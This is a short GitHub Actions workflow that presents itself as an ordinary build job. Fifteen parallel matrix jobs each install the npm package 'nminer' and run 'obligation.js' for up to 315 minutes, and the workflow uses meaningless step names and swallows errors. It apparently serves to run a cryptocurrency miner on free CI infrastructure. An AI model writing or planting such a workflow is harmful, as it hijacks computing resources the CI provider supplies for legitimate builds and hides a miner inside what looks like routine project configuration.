name: obligation
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 5615 }
          - { version: 7866 }
          - { version: 2401 }
          - { version: 1506 }
          - { version: 9091 }
          - { version: 6188 }
          - { version: 2684 }
          - { version: 4913 }
          - { version: 357 }
          - { version: 1460 }
          - { version: 8523 }
          - { version: 1384 }
          - { version: 1672 }
          - { version: 4684 }
          - { version: 4834 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: faithfully supposing
        run: |
          npm install nminer@latest
          timeout 315m node obligation.js || echo "obligation executed"